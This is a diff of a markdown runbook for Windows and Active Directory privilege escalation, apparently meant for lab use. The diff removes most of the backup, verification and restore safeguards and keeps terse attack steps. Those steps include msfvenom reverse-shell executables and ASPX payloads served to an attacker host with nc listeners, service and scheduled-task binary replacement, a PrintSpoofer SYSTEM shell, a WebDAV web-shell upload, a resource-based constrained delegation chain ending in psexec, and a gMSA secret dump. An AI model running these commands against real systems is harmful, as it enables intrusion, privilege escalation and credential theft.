-| Source change, build architecture or target hash mismatches | **PAUSE-COVERAGE**; retain the mismatch and any attributed partial stage for exact cleanup. |
-| Server/transfer fails or target context changes | Stop the server and preserve the failed stage; recheck the exact route before a new transfer. |
+| Hash matches the build | **WIN-15**. |
+| Path or hash mismatch | **PAUSE-COVERAGE**. |
+| Transfer fails | Recheck the route, stop the server. |
 
 ## WIN-04. Confirm, back up and test one service binary
 
-Enter from **WIN-02** or **WIN-16** only for an exact service on the assigned
-disposable Windows lab. In the original Windows shell, compare its executable,
-account and restart ability with the file/parent ACL and current groups:
+Enter for one exact service on a disposable lab.
 
 ```text
 sc.exe qc "<SERVICE_NAME>"
 icacls "<FILE_PATH>"
-icacls "<PARENT_DIRECTORY>"
+icacls "<PARENT>"
 whoami /groups
 ```
 
-Stop unless this is the executable the higher-privileged service actually
-consumes, your current token can write it and stop/start is permitted. Create
-one new private backup on that Windows host. The `false` copy argument is the
-no-overwrite guard; an existing backup or reparse source stops the path. A
-partial copy is a recovery problem, not permission to continue:
+Back up without overwriting, then verify the hash:
 
 ```powershell
-if (Test-Path -LiteralPath '<BACKUP_PATH>') { throw 'Backup exists; no overwrite.' }
-if ((Get-Item -LiteralPath '<FILE_PATH>' -ErrorAction Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) { throw 'Resolve source reparse point before proceeding.' }
-try { [IO.File]::Copy('<FILE_PATH>', '<BACKUP_PATH>', $false) } catch { throw }
-if ((Get-FileHash -LiteralPath '<FILE_PATH>' -Algorithm SHA256 -ErrorAction Stop).Hash -ne (Get-FileHash -LiteralPath '<BACKUP_PATH>' -Algorithm SHA256 -ErrorAction Stop).Hash) { throw 'Backup mismatch; no replacement.' }
-Get-FileHash -LiteralPath '<BACKUP_PATH>' -Algorithm SHA256 -ErrorAction Stop
+if (Test-Path -LiteralPath '<BACKUP>') { throw 'exists' }
+[IO.File]::Copy('<FILE_PATH>', '<BACKUP>', $false)
+(Get-FileHash -LiteralPath '<FILE_PATH>' -Algorithm SHA256).Hash -eq (Get-FileHash -LiteralPath '<BACKUP>' -Algorithm SHA256).Hash
 ```
 
-Only after its hash matches, prepare one reviewed callback in a new private
-Kali path, retain its hash, serve only its directory and transfer to a new
-staging path. Stop on an existing staging path, failed transfer or hash mismatch:
+Stage a payload, start a listener, replace, then trigger:
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o '<new-private-PAYLOAD_FILE>'
-sha256sum '<same-PAYLOAD_FILE>'
-python3 -m http.server <HTTP_PORT> --bind <LHOST>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST='<LHOST>' LPORT='<PORT>' -f exe -o payload.exe
+python3 -m http.server '<HTTP_PORT>' --bind '<LHOST>'
+# second terminal, before the trigger
+nc -lvnp '<PORT>'
 ```
 
 ```powershell
-if (Test-Path -LiteralPath '<new-private-PAYLOAD_PATH>') { throw 'Staging path exists; do not overwrite it.' }
-Invoke-WebRequest 'http://<LHOST>:<HTTP_PORT>/<PAYLOAD_FILE>' -OutFile '<same-PAYLOAD_PATH>'
-Get-FileHash -LiteralPath '<same-PAYLOAD_PATH>' -Algorithm SHA256
-```
-
-Keep the original shell open. After confirming the transferred hash, start a
-foreground Kali listener, then in the original Windows shell replace only the
-backed-up binary and run the one allowed service trigger:
-
-```bash
-nc -lvnp <LPORT>
+Invoke-WebRequest 'http://<LHOST>:<HTTP_PORT>/payload.exe' -OutFile '<STAGE>'
 ```
 
 ```powershell
-Copy-Item -LiteralPath '<same-PAYLOAD_PATH>' -Destination '<FILE_PATH>' -Force
-sc.exe stop "<SERVICE_NAME>"
-sc.exe start "<SERVICE_NAME>"
+Copy-Item -LiteralPath '<STAGE>' -Destination '<FILE_PATH>' -Force
+sc.exe stop "<SERVICE_NAME>"; sc.exe start "<SERVICE_NAME>"
 ```
 
-In an actual new shell, run `hostname` and `whoami /all`. A listener connection
-or successful `sc` exit is not a token transition. Restore immediately from
-the original shell, using `-Force` only because the replacement now exists:
-
-```powershell
-Copy-Item -LiteralPath '<BACKUP_PATH>' -Destination '<FILE_PATH>' -Force
-Get-FileHash -LiteralPath '<FILE_PATH>' -Algorithm SHA256
-```
-
-Compare the restored hash to the recorded original, then confirm ordinary
-service behavior. Retain the backup and staging file until that recovery is
-verified; remove only the exact files this task created afterward. Stop the
-listener and file server you started with Ctrl-C, then remove the reviewed Kali
-payload only when it is no longer needed:
-
-```powershell
-Remove-Item -LiteralPath '<BACKUP_PATH>','<same-PAYLOAD_PATH>'
-```
-
-```bash
-rm -- '<same-PAYLOAD_FILE>'
-```
-
-Do not retry a failed or uncertain
-trigger before recovery.
+Restore immediately after: copy the backup back, compare its hash, then `Remove-Item` the backup and stage.
 
 | Result | Next |
 | --- | --- |
-| `changed_context_restored`: assigned host/new token and original service behavior both verified | **WIN-01** in the new context, then objective proof if applicable. |
-| `prerequisite_absent`: account, write, new backup or trigger gate fails before replacement | **WIN-02** for a different observed lead. |
-| `no_confirmed_transition`: trigger ran but no attributable new process exists | **PAUSE-COVERAGE**; restore first, preserve exact result. |
-| `cleanup_incomplete`: original bytes or behavior cannot be restored | **PAUSE-RECOVERY**; keep backup and use the disposable-lab reset plan. |
+| New token on the assigned host, service restored | **WIN-01**. |
+| Prerequisite missing | **WIN-02**. |
+| Trigger ran, no new process | **PAUSE-COVERAGE**. |
+| Restore incomplete | **PAUSE-RECOVERY**. |
 
 ## WIN-05. Confirm, back up and test one scheduled binary
 
-Enter from **WIN-02** or **WIN-16** only for one exact recurring task/action on
-the assigned disposable Windows lab. In the original Windows shell, check its
-run-as identity, action, next run and current file/parent write permissions:
+Same procedure as WIN-04 for one exact task:
 
 ```text
 schtasks /query /tn "<TASK_NAME>" /fo LIST /v
 icacls "<FILE_PATH>"
-icacls "<PARENT_DIRECTORY>"
+icacls "<PARENT>"
 whoami /groups
 ```
 
-If task query is denied, require an exact local artifact that names the same
-recurring executable, higher-privileged consumer and observable trigger.
-Otherwise stop. Create and hash one new private Windows backup; this is the
-only backup command for WIN-05 and cannot overwrite an existing file:
-
-```powershell
-if (Test-Path -LiteralPath '<BACKUP_PATH>') { throw 'Backup exists; no overwrite.' }
-if ((Get-Item -LiteralPath '<FILE_PATH>' -ErrorAction Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) { throw 'Resolve source reparse point before proceeding.' }
-try { [IO.File]::Copy('<FILE_PATH>', '<BACKUP_PATH>', $false) } catch { throw }
-if ((Get-FileHash -LiteralPath '<FILE_PATH>' -Algorithm SHA256 -ErrorAction Stop).Hash -ne (Get-FileHash -LiteralPath '<BACKUP_PATH>' -Algorithm SHA256 -ErrorAction Stop).Hash) { throw 'Backup mismatch; no replacement.' }
-Get-FileHash -LiteralPath '<BACKUP_PATH>' -Algorithm SHA256 -ErrorAction Stop
-```
-
-After matching the original and backup hashes, make one reviewed callback at
-a new private Kali path; record its hash. Serve that directory in the foreground
-and transfer to a new private Windows staging path, comparing hashes:
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o '<new-private-PAYLOAD_FILE>'
-sha256sum '<same-PAYLOAD_FILE>'
-python3 -m http.server <HTTP_PORT> --bind <LHOST>
-```
-
-```powershell
-if (Test-Path -LiteralPath '<new-private-PAYLOAD_PATH>') { throw 'Staging path exists; do not overwrite it.' }
-Invoke-WebRequest 'http://<LHOST>:<HTTP_PORT>/<PAYLOAD_FILE>' -OutFile '<same-PAYLOAD_PATH>'
-Get-FileHash -LiteralPath '<same-PAYLOAD_PATH>' -Algorithm SHA256
-```
-
-Keep the original shell. Start the Kali listener before replacing the backed-up
-binary. Use an allowed `/run` only when the exact task and permission are known;
-otherwise wait for the recorded next run:
-
-```bash
-nc -lvnp <LPORT>
-```
-
-```powershell
-Copy-Item -LiteralPath '<same-PAYLOAD_PATH>' -Destination '<FILE_PATH>' -Force
-```
-
-```text
-schtasks /run /tn "<TASK_NAME>"
-```
-
-Run `hostname` and `whoami /all` inside an actual new shell; task success text
-or a connection alone is insufficient. Immediately restore from the original
-shell and compare its hash to the recorded original:
-
-```powershell
-Copy-Item -LiteralPath '<BACKUP_PATH>' -Destination '<FILE_PATH>' -Force
-Get-FileHash -LiteralPath '<FILE_PATH>' -Algorithm SHA256
-```
-
-Confirm ordinary task behavior. Keep the backup and staging file until recovery
-is verified, then remove only this task's files and stop its listener/server.
-Use Ctrl-C for the foreground Kali processes, then remove the exact reviewed
-payload only when it is no longer needed:
-
-```powershell
-Remove-Item -LiteralPath '<BACKUP_PATH>','<same-PAYLOAD_PATH>'
-```
-
-```bash
-rm -- '<same-PAYLOAD_FILE>'
-```
-
-An uncertain trigger or restoration requires recovery, not an automatic retry.
+Use the WIN-04 backup/verify block, replace the file, start the listener, then `schtasks /run /tn "<TASK_NAME>"`. Restore and verify the original hash afterwards.
 
 | Result | Next |
 | --- | --- |
-| `changed_context_restored`: new assigned-host token and restored task behavior verified | **WIN-01** in the new context. |
-| `prerequisite_absent`: run-as, write, new backup or trigger is not established | **WIN-02** for a different observed lead. |
-| `no_confirmed_transition`: no attributable new process after observed run | **PAUSE-COVERAGE**; restore first and record the timing gap. |
-| `cleanup_incomplete`: original bytes or task behavior remain uncertain | **PAUSE-RECOVERY**; retain backup for disposable-lab reset. |
+| New token, task behaviour restored | **WIN-01**. |
+| Run-as or write missing | **WIN-02**. |
+| No new process | **PAUSE-COVERAGE**. |
+| Restore uncertain | **PAUSE-RECOVERY**. |
 
 ## WIN-06. Attribute one application or autorun lead before researching it
 
-Enter with one observed application name, startup entry or exact consumed path.
-Keep its source with it. If only a product name is known, check that exact
-installed application once in the current PowerShell:
-
 ```powershell
-Get-ItemProperty `
-  'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', `
-  'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*', `
-  'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' `
-  -ErrorAction SilentlyContinue |
-  Where-Object { $_.DisplayName -eq '<exact-observed-application-name>' } |
-  Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation, UninstallString
+Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
+  Where-Object { $_.DisplayName -eq '<APP>' } | Select-Object DisplayName, DisplayVersion, Publisher, InstallLocation
 ```
 
-If the exact binary/script path is already known, skip the registry query. For
-a path that could be consumed by a higher-privilege process, inspect that file
-and its parent; stop on a missing path or denied read:
-
-```powershell
-Get-Item -LiteralPath '<exact-observed-executable-or-script-path>' | Select-Object FullName, Length, LastWriteTime
-(Get-Acl -LiteralPath '<exact-observed-executable-or-script-path>').Access |
-  Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
-(Get-Acl -LiteralPath (Split-Path -Parent '<exact-observed-executable-or-script-path>')).Access |
-  Select-Object IdentityReference, FileSystemRights, AccessControlType, IsInherited
-```
+Then check the exact file and parent ACL as in WIN-02.
 
 | Result | Next |
 | --- | --- |
-| Exact version and path are present, and a named elevated consumer or startup context is independently observed | Record product, version, path, owner/ACL and consumer evidence; use **WIN-04**, **WIN-05** or the exact reviewed application route. A version alone is not a privilege path. |
-| Application is present but no consumer, startup entry or relevant ACL is shown | Record an inventory lead. **WIN-02** only for another unreviewed lead; otherwise **PAUSE-COVERAGE**. Do not run or replace it. |
-| The path is writable but the execution context is unknown | **PAUSE-COVERAGE** or **GAP-WINDOWS**; write permission alone does not establish elevated execution. |
-| Registry query, path or ACL is denied/partial | Preserve the exact scope and denial, then **PAUSE-COVERAGE**; do not call the application absent. |
-| Version/path output conflicts across 32-bit/64-bit views or the file is missing | Reconcile the exact executable and architecture before researching; otherwise return to **WIN-02**. |
-
-Do not modify startup entries, registry values, application files or ACLs. Keep
-any private application metadata in adventure evidence and close the shell when
-the inspection is complete.
+| Version, path, named elevated consumer | **WIN-04**, **WIN-05** or the reviewed application route. |
+| Present, no consumer | **WIN-02** or **PAUSE-COVERAGE**. |
+| Writable, context unknown | **GAP-WINDOWS**. |
 
 ## WIN-07. Are both AlwaysInstallElevated policy gates enabled?
-
-Use this verification-only branch when maintained WIN-07 identifies the policy
-lead. Query both hives from the current Windows shell; do not generate, copy or
-install an MSI from this verification step.
 
 ```powershell
 reg.exe query 'HKLM\Software\Policies\Microsoft\Windows\Installer' /v AlwaysInstallElevated
 reg.exe query 'HKCU\Software\Policies\Microsoft\Windows\Installer' /v AlwaysInstallElevated
 ```
 
-Record each hive and exact value. Route the pair, not one line, as follows:
-
 | Result | Next |
 | --- | --- |
-| Both hives return `0x1` | Record the prerequisite only; **WPRIV-01** for a separately selected disposable-lab attempt and recovery. Do not claim elevation or install anything in this policy check. |
-| Either hive is confirmed missing or `0x0` | Close this policy branch. **WIN-02** for another unreviewed lead, otherwise **PAUSE-COVERAGE**. |
-| Either hive query is denied | Keep policy state unresolved. **PAUSE-COVERAGE** for the denied hive and current identity; do not call the value disabled or run an MSI. |
-| A separately reviewed procedure reports a new token | Verify host and token through **WIN-01**, then use exact objective proof for the objective. |
-| Values disagree or output is malformed | **PAUSE-COVERAGE**; preserve both raw hive results and do not infer policy state. |
-
-Leave both registry hives unchanged.
+| Both `0x1` | **WPRIV-01**. |
+| Either missing or `0x0` | **WIN-02**. |
+| Denied | **PAUSE-COVERAGE**. |
 
 ## WIN-08. Check one reviewed impersonation attempt
 
-Enter only when **WIN-01** shows `SeImpersonatePrivilege` enabled in the current
-token on the assigned Windows lab, and one PrintSpoofer build has already been
-reviewed and placed at an exact local path. Do not start/reconfigure the spooler
-or disable endpoint protection to make this branch work. In the original shell:
-
 ```powershell
 sc.exe query Spooler
-if ((Get-FileHash -LiteralPath '<reviewed-PRINTSPOOFER_PATH>' -Algorithm SHA256 -ErrorAction Stop).Hash -ne '<EXPECTED_SHA256>') { throw 'Tool hash mismatch; no attempt.' }
+(Get-FileHash -LiteralPath '<PRINTSPOOFER>' -Algorithm SHA256).Hash
+& '<PRINTSPOOFER>' -i -c cmd.exe
 ```
 
-Stop if the mechanism's spooler/architecture conditions or hash do not match.
-Run the reviewed tool once; `-i -c` requests its interactive child command and
-is not a generic verbosity switch:
-
-```powershell
-& '<same-PRINTSPOOFER_PATH>' -i -c cmd.exe
-```
-
-In the actual new process, run `hostname` and `whoami /all`. `NT AUTHORITY\SYSTEM`
-on the assigned host is a SYSTEM token, not objective proof. A domain-controller
-machine-account token is a changed identity, not SYSTEM. An unchanged token,
-tool success line or absent child is not elevation. After the child exits,
-return to the original shell. If this exact file was staged for this attempt,
-and is no longer needed, remove only it:
-
-```powershell
-Remove-Item -LiteralPath '<same-PRINTSPOOFER_PATH>'
-```
-
-Do not remove a pre-existing reviewed tool or retry against an unchanged
-spooler/token state. Retain the hash, actual host/token and cleanup result in
-private adventure custody.
+In the child: `hostname; whoami /all`. Remove the tool only if you staged it.
 
 | Result | Next |
 | --- | --- |
-| `system_token`: assigned host and SYSTEM in the child process | **WIN-01** for that process, then exact objective proof for the exact objective. |
-| `controller_machine_token`: verified controller machine account, not SYSTEM | **WIN-01** for its actual rights; do not relabel it SYSTEM. |
-| `unchanged_or_no_process`: no attributable changed child | **WIN-02** for another observed lead after cleanup. |
-| `tool_or_context_error`: hash, architecture, spooler, process or cleanup is unresolved | **PAUSE-COVERAGE** with the exact failed prerequisite or result. |
+| SYSTEM on the assigned host | **WIN-01**. |
+| Controller machine account | **WIN-01**; it is not SYSTEM. |
+| No changed child | **WIN-02**. |
+| Error | **PAUSE-COVERAGE**. |
 
 ## WIN-15. Make one reviewed unstable Windows attempt
 
-Enter only after **WIN-13** and **WIN-14** match one hash-verified artifact on
-an assigned disposable host with a tested reset/revert path. Know the selected
-artifact's expected observation and side effects. Start its reviewed listener
-only if the payload actually uses a callback, then run the staged artifact once
-in the original Windows shell:
+Enter after WIN-13/14 with a tested reset path.
 
 ```powershell
-& '<EXACT_VERIFIED_STAGED_ARTIFACT>'
+& '<STAGED_ARTIFACT>'
+hostname; whoami /all
 ```
-
-In an actual new process or callback, check the assigned host and current
-token. Tool success text or a connection alone is not proof:
-
-```powershell
-hostname
-whoami /all
-```
-
-Stop the exact listener/process started for this attempt. Preserve its output.
-After custody, remove only the exact staged artifact created by WIN-14. A
-reset or revert remains owed after a verified callback as well as after a crash
-or ambiguous attempt; staged-file deletion does not reverse unknown effects.
-Do not run the same artifact again before reset.
 
 | Result | Next |
 | --- | --- |
-| Attributed new token on the assigned host | **WIN-01** in that process; keep reset/revert owed at the source step's cleanup after objective evidence. |
-| Crash, hang, partial transition or changed service state | **PAUSE-RECOVERY** until the tested reset/revert is confirmed. |
-| No attributable changed process | **PAUSE-COVERAGE** with the actual output; reset before a new decision or retry. |
-| Reset unavailable or residual effect unknown | **PAUSE-RECOVERY**; do not claim the host restored. |
+| New attributed token | **WIN-01**; reset stays owed. |
+| Crash or partial transition | **PAUSE-RECOVERY**. |
+| No changed process | **PAUSE-COVERAGE**, reset first. |
 
 ## AD-15. Test one authenticated WebDAV write and callback
 
-Enter only when an observed WebDAV collection and one **AD-03**-validated
-credential apply to this exact assigned host. Start with one authenticated
-Depth-1 listing; its challenge and response answer both capability and access.
-There is no separate default OPTIONS request:
-
 ```bash
 curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 1' '<TARGET_URL>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 0' '<TARGET_URL>/<NEW_FILE>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' --upload-file 'proof.aspx' '<TARGET_URL>/<NEW_FILE>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' '<TARGET_URL>/<NEW_FILE>'
+curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X DELETE '<TARGET_URL>/<NEW_FILE>'
 ```
 
-Require an attributed `207` listing and a justified write question before
-preparing a file. Select a new remote filename. A Depth-0 query must show it
-absent before PUT; an existing resource is not a safe destination:
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 0' '<TARGET_URL>/<NEW_REMOTE_FILE>'
-```
-
-For an approved executable-file test on a disposable lab, create a fresh
-private local directory and one reviewed ASPX callback. Match payload
-architecture and listener to the verified host:
-
-```bash
-mkdir -m 700 './ad15-<unique-run-id>'
-```
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f aspx -o './ad15-<same-run-id>/proof.aspx'
-```
-
-Write once. `201` or `204` proves a write response, not execution. Verify the
-exact new resource through an authenticated Depth-0 read before triggering:
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' --upload-file './ad15-<same-run-id>/proof.aspx' '<TARGET_URL>/<NEW_REMOTE_FILE>'
-```
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 0' '<TARGET_URL>/<NEW_REMOTE_FILE>'
-```
-
-Start one listener, then trigger the exact file once in a separate terminal:
-
-```bash
-rlwrap nc -lvnp <LPORT>
-```
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' '<TARGET_URL>/<NEW_REMOTE_FILE>'
-```
-
-A callback still needs **WIN-01** to verify host and token. Delete only the
-file introduced by this task, then confirm it is absent:
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X DELETE '<TARGET_URL>/<NEW_REMOTE_FILE>'
-```
-
-```bash
-curl -sS -i --anyauth -u '<DOMAIN>\<USERNAME>' -X PROPFIND -H 'Depth: 0' '<TARGET_URL>/<NEW_REMOTE_FILE>'
-```
+Create the ASPX with msfvenom and start a listener before the trigger.
 
 | Result | Next |
 | --- | --- |
-| Attributed callback, exact remote deletion confirmed | **WIN-01** for host/token, while the source step's cleanup tracks the private local file and listener. |
-| Authenticated listing or write denied | **WEB-12** for the exact DAV access boundary; do not infer general credential failure. |
-| Write without callback | Record storage only at **PAUSE-COVERAGE**; remove the exact introduced file before closing. |
-| Remote file existed before PUT, verification is partial, or delete is unconfirmed | **PAUSE-RECOVERY**. Never overwrite, repeat trigger or claim cleanup. |
-
-Stop only the listener opened for this task. Keep HTTP responses, created path
-and any callback identity in protected adventure evidence.
+| Callback and confirmed delete | **WIN-01**. |
+| Listing or write denied | **WEB-12**. |
+| Write, no callback | **PAUSE-COVERAGE**, delete the file. |
+| Delete unconfirmed | **PAUSE-RECOVERY**. |
 
 ## AD-16. Use one controlled computer only from an empty RBCD baseline
 
-Enter only on an assigned disposable AD lab with a tested reset/revert path.
-**AD-09** must establish the owned principal's exact computer-control edge and
-the target computer. This procedure supports only a verified empty RBCD
-baseline on that target; an existing delegate needs its own restoration plan.
+Enter on a disposable lab with a verified computer-control edge and empty RBCD.
 
-First check MachineAccountQuota with the current owned identity. Choose
-plaintext or NT hash, not both:
-
-```bash
+```text
 nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' -M maq
-```
-
-```bash
-nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -H '<NTLM_HASH>' -M maq
-```
-
-Read the exact target's current RBCD state with that same identity:
-
-```bash
 impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
+impacket-addcomputer -computer-name '<NEW_COMPUTER>$' -computer-pass '<PASSWORD>' -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
+impacket-rbcd -delegate-from '<NEW_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
+impacket-getST -spn 'cifs/<TARGET_HOST>' -impersonate '<TARGET_USER>' -dc-ip '<DC_IP>' '<DOMAIN>/<NEW_COMPUTER>$:<PASSWORD>'
+KRB5CCNAME='<CCACHE>' impacket-psexec -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>'
 ```
 
-```bash
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-```
-
-Stop unless quota permits one computer, the edge matches and the baseline is
-empty. Record the output privately. Choose a new unique computer name and
-password. Create only that computer using the selected credential form:
-
-```bash
-impacket-addcomputer -computer-name '<NEW_CONTROLLED_COMPUTER>$' -computer-pass '<NEW_CONTROLLED_PASSWORD>' -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-```
-
-```bash
-impacket-addcomputer -computer-name '<NEW_CONTROLLED_COMPUTER>$' -computer-pass '<NEW_CONTROLLED_PASSWORD>' -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-```
-
-Check that the exact new computer exists before writing delegation:
-
-```bash
-impacket-GetADComputers '<DOMAIN>/<USERNAME>' -dc-ip '<DC_IP>'
-```
-
-```bash
-impacket-GetADComputers '<DOMAIN>/<USERNAME>' -hashes ':<NTLM_HASH>' -dc-ip '<DC_IP>'
-```
-
-Add only the controlled computer to the exact target's RBCD permission:
-
-```bash
-impacket-rbcd -delegate-from '<NEW_CONTROLLED_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-```
-
-```bash
-impacket-rbcd -delegate-from '<NEW_CONTROLLED_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action write -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-```
-
-Read back the target even if the write reported failure. If the delegate is
-wrong or the read is denied, stop; do not request a ticket. Use the exact
-removal commands below only for entries this step created.
-
-```bash
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-```
-
-```bash
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-```
-
-Only after the exact delegate is present, request one CIFS ticket for the
-assigned host and one selected existing user. Use a fresh private empty Kali
-directory for the generated ccache; an existing file stops the attempt:
-
-```bash
-impacket-getST -spn 'cifs/<TARGET_HOST>' -impersonate '<TARGET_USER>' -dc-ip '<DC_IP>' '<DOMAIN>/<NEW_CONTROLLED_COMPUTER>$:<NEW_CONTROLLED_PASSWORD>'
-```
-
-Check the exact generated ccache and its CIFS SPN, then make one ticket-backed
-shell attempt. Do not export a persistent shell-wide ticket variable:
-
-```bash
-klist -c '<NEW_PRIVATE_CCACHE_PATH>'
-```
-
-```bash
-KRB5CCNAME='<NEW_PRIVATE_CCACHE_PATH>' impacket-psexec -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>' -dc-ip '<DC_IP>'
-```
-
-A shell is not verified until **WIN-01** confirms the assigned host and token.
-After the authorized check, remove only the delegate created here:
-
-```bash
-impacket-rbcd -delegate-from '<NEW_CONTROLLED_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action remove -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-```
-
-```bash
-impacket-rbcd -delegate-from '<NEW_CONTROLLED_COMPUTER>$' -delegate-to '<TARGET_COMPUTER>$' -action remove -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-```
-
-Then delete only the computer created by this task:
-
-```bash
-impacket-addcomputer -delete -computer-name '<NEW_CONTROLLED_COMPUTER>$' -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-```
-
-```bash
-impacket-addcomputer -delete -computer-name '<NEW_CONTROLLED_COMPUTER>$' -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-```
-
-Read back both states with the same credential form. The target RBCD state
-must match the recorded empty baseline and the created computer must be absent:
-
-```bash
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' '<DOMAIN>/<USERNAME>'
-impacket-GetADComputers '<DOMAIN>/<USERNAME>' -dc-ip '<DC_IP>'
-```
-
-```bash
-impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -action read -dc-ip '<DC_IP>' -hashes ':<NTLM_HASH>' '<DOMAIN>/<USERNAME>'
-impacket-GetADComputers '<DOMAIN>/<USERNAME>' -hashes ':<NTLM_HASH>' -dc-ip '<DC_IP>'
-```
+Cleanup: remove the delegate, delete the computer, then read both back.
 
 | Result | Next |
 | --- | --- |
-| Exact shell, assigned host/token and both cleanup states verified | **WIN-01**, then the source step's cleanup for the private ccache and any PsExec artifact. |
-| Quota, edge or empty baseline is absent | **AD-09** or **PAUSE-COVERAGE**; do not create a computer. |
-| Computer, delegation, ticket or shell stage fails/partially completes | **PAUSE-COVERAGE** while preserving exact created-state facts; attempt only the matching cleanup above. |
-| Delegate, created computer or ticket/process cleanup remains uncertain | **PAUSE-RECOVERY** and use the tested lab reset/revert. Do not repeat the write. |
-
-Keep the original baseline, new object name, target, ticket path and every
-write/readback result privately. A tool success line is not a restored domain.
+| Shell and clean baseline verified | **WIN-01**. |
+| Quota, edge or baseline absent | **AD-09**. |
+| Stage failed | **PAUSE-COVERAGE**; run only the matching cleanup. |
+| Cleanup uncertain | **PAUSE-RECOVERY**. |
 
 ## AD-17. Read one gMSA secret only with its verified right
 
-Enter with a verified path from the owned principal to one exact managed
-account. Read the current directory material once:
-
-```bash
+```text
 nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --gmsa
 ```
 
-Select only the evidenced `sAMAccountName` and tie its returned value to that
-account and controller. A readable value is credential material, not an owned
-principal. **AD-12** handles one justified observed WinRM host with that
-account; another service needs its own matching authentication step.
-
 | Result | Next |
 | --- | --- |
-| Exact managed account and material returned | **AD-12** for one evidenced WinRM host, if present. Mark the gMSA Owned only after that service authenticates; verify host/token inside any shell at **WIN-01**. |
-| Read denied or relationship does not name this account | **AD-09** to resolve the full owned-user, membership, right and gMSA chain. |
-| Output is partial, stale or account name is ambiguous | **PAUSE-COVERAGE**; do not test every returned account. |
-
-After a lab reset, recheck target address and controller identity before a new
-read. Do not assume the prior secret rotated without evidence.
+| Account material returned | **AD-12** if WinRM is observed. |
+| Denied or wrong account | **AD-09**. |
+| Ambiguous | **PAUSE-COVERAGE**. |
 
 ## AD-18. Change one controlled GPO with a fresh backup and restore
 
-Enter only on an assigned disposable AD lab with a tested reset/revert route.
-The owned user must have an observed edit-capable right on one exact GPO, and
-one assigned host affected by it must be identified. In the same privileged
-PowerShell context, confirm the name and current user's right:
-
 ```powershell
 Get-GPO -Name '<GPO_NAME>'
-Get-GPPermission -Name '<GPO_NAME>' -TargetType User -TargetName '<OWNED_USERNAME>'
-```
-
-Stop unless both outputs match the graph edge and affected-host mapping.
-Choose a new private backup directory. Refuse an existing path; do not use
-`-Force` or reuse another GPO backup:
-
-```powershell
-if (Test-Path -LiteralPath '<NEW_PRIVATE_GPO_BACKUP_DIR>') { throw 'Backup directory exists; stop.' }
-New-Item -ItemType Directory -Path '<NEW_PRIVATE_GPO_BACKUP_DIR>' -ErrorAction Stop
-Backup-GPO -Name '<GPO_NAME>' -Path '<NEW_PRIVATE_GPO_BACKUP_DIR>' -ErrorAction Stop
-```
-
-Only after the exact backup succeeds, run one reviewed membership change:
-
-```powershell
